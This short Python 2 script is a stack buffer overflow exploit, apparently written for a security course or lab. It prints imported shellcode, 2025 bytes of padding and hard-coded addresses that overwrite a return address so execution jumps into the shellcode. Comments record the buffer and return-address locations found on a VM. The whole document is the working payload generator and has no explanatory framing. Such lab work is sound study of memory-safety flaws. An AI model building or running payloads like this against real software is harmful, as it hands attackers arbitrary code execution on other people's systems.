from shellcode import shellcode
print shellcode+'A'*2025+ '\x28'+'\xd6'+'\xfe'+'\xbf' + '\x3c'+ '\xde'+ '\xfe'+'\xbf'

# len(shellcode)=23

# move edx into memory of eax, so eax is return address and edx is shell address
#return after ebp at 0xbffeffac:
#0xbffef798: starting of my buffer
#0xbffef7f0: end of the buffer (the last extra 8 bytes)

#VM
#0xbffede3c: is the return addr
#0xbffed628:  starting of my buffer